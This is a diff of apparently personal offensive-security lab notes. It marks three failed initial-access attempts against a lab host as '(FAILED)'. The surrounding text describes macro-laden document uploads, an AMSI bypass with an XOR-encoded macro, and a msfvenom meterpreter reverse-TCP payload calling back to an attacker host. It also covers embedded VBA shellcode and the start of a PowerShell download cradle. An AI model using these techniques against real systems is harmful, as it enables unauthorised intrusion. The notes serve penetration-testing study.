@@ -15,7 +15,7 @@ set stageencoder x86/xor_dynamic
 
 ### Ch1 Notes
 
-### Initial access failed method 1-triggle asmi bypass, add marco payload xor, 
+### (FAILED)Initial access failed method 1-triggle asmi bypass, add marco payload xor 
 1. Identify the web port on 192.168.49.121  allowing file upload. Upload a doc file which allow which allow [ping marco](/msf/ping.vba) command to verify the target allowing code execution though marco 
 
 2. Create stageless tcp raw payload 
@@ -32,7 +32,7 @@ sudo msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.49.141  LPORT
 - Craft the [marco](/msf/asmibypasswithxor.vba) and attached to a doc file
 5. No call back, no download log, maybe the powershell is not allowed??
 
-### Initial access failed method 2-embed vba shell code in the doc file
+### (FAILED)Initial access failed method 2-embed vba shell code in the doc file
 
 1. Create x86 staged payload
 ```
@@ -50,7 +50,7 @@ run -j
 ```
 4. Not working... maybe the shell code get flaged?
 
-### Initial access failed method 3-embed powershell download cradle to execute payload
+### (FAILED)Initial access failed method 3-embed powershell download cradle to execute payload
 ```
 Sub MyMacro()
     Dim str As String
